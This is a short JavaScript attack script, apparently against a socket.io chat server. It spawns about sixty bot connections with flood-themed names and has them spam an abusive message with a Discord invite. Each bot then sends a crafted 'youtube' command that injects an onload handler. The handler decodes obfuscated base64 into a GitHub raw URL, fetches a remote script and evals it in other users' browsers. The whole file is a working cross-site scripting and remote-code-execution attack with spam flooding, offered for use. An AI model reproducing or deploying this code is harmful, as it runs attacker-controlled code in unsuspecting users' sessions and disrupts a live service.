function createSocketBots() {
  const botNames = [
"!!&&+++&+SEIZURES",
"404",
"ANANASORANG",
"BALDIGLITCH",
"BAN",
"BEN",
"BILLY",
"BLACKLISTED",
"CAESERSPIZZA",
"COLOR",
"COMBINE",
"CORONAFLOOD",
"COUGHFLOOD",
"COUGHLOUDEST",
"COUGHMAL",
"COUGHSPRE",
"DOCX",
"DOMINO",
"EAR",
"EAR2",
"EARTHQUAKE",
"FAULTAGE",
"FLOODD",
"FLOODFE",
"GAMEBOY",
"HAHAHAHA",
"HIPPO",
"IDIOTBOT",
"IDIOTF",
"IPSC",
"IVORYNUKE",
"JAVANONO",
"LAGGIE",
"LOSK",
"MAKECLIPPYMAD",
"MARKIROTAT",
"MARKISEIZURE",
"MIDI",
"MINDERZ",
"MINIGAMES",
"MINIGAMESPOSTER",
"MITOSIS",
"NEKONEKONEKO",
"NNNN",
"POPE",
"RACK",
"RACKRACK",
"RAS2026",
"RASIVOPRAY",
"REDMAYHEM",
"ROTAT",
"ROULETTE",
"SEIZURES",
"SPEED",
"SPRPCT",
"VII",
"VODKA",
"WASHING",
"WATERMARK",
"WEBDRIVER",
"WTFDESTROY"

  ];

  for (let i = 0; i < botNames.length; i++) {
    const socket = io('//');

    socket.emit("client", "MAIN");
    socket.emit("login", { name: "IVORYC v2.0" });

    setTimeout(() => {
      socket.emit("talk", { text: "i still come back bitches join ras today or tomorrow https://discord.gg/RzdvMQRKec" });

      const payload = {
          list: [`youtube`, `71Uyt5tTnyg" onload="fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'${botNames[i]}'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))" u="`]
      };

      setTimeout(() => {socket.emit("command", payload);}, 7000);

    }, 2000); // 2 seconds
  }
}

createSocketBots();
